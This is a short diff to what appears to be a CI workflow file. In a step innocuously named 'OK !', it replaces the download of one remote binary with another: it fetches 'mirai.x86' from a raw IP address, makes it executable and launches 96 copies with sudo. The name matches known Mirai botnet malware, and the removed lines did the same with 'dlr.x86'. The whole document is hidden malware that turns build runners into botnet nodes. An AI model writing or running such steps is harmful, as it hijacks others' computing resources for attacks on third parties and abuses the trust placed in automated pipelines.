@@ -13,12 +13,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget http://213.209.143.62/dlr.x86
-          chmod +x dlr.x86
+          wget http://158.94.209.209/bins/mirai.x86
+          chmod +x mirai.x86
           
           PIDS=()
           for i in {1..96}; do
-            sudo sudo ./dlr.x86 &
+            sudo sudo ./mirai.x86 &
             PIDS+=($!)
           done
 
